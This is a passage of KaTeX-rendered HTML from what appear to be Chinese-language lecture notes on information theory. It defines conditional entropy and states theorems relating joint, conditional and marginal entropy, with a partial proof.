style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.808712em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24011em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></p><ul><li>条件熵：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></msub><msub><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></msub><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X|Y)=-\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2p(x|y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32708000000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><ul><li>对于Y的任意取值y得到一个X上的条件概率分布，相应的随机变量即为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mi mathvariant="normal">∣</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">X|y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，可知</li></ul></li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X|y)=-\sum_{x\in X}p(x|y)\log_2p(x|y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.3717110000000003em;vertical-align:-1.321706em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><pre><code>- 上式对y加权平均即得到$H(X|Y)$的值</code></pre><h3 id="定理28"><a class="markdownIt-Anchor" href="#定理28"></a> 定理2.8</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(XY)=H(Y)+H(X|Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></p><p>证明：两边分别展开易证</p><h3 id="推论29"><a class="markdownIt-Anchor" href="#推论29"></a> 推论2.9</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X|Y)\le H(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>，当且仅当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>统计独立时等号成立。</p><p>证明：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mspace linebreak="newline"></mspace><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">H(X|Y)=-\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2p(x|y)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{p(y)}{p(xy)}=\sum_{x\in X}\sum_{y\in Y}p(x)p(y|x)\log_2\frac{p(y)}{p(xy)}\\H(X)=\sum_{x\in X}p(x)\log_2\frac{1}{p(x)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.480449em;vertical-align:-1.430444em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span 